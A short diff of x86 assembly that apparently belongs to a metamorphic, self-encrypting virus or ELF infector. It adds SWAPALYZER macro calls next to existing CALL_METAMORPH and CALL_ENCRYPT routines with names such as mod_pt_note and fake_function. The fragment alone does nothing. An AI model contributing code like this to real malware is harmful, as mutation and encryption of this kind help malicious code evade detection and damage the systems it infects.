@@ -788,10 +788,16 @@ section .text
         CALL_ENCRYPT(set_unique_trace)
 
 	.mod_functions:
+        SWAPALYZER(crazy, 7)
+        SWAPALYZER(mod_pt_note, 2)
+        SWAPALYZER(directory_name_isdigit, 3)
+        SWAPALYZER(fake_function, 4)
+
         CALL_METAMORPH(crazy, 7)
         CALL_METAMORPH(mod_pt_note, 2)
         CALL_METAMORPH(directory_name_isdigit, 3)
         CALL_METAMORPH(fake_function, 4)
+         
 
     .encrypt_data_block:
         CALL_ENCRYPT(encrypt_block) ; encripta
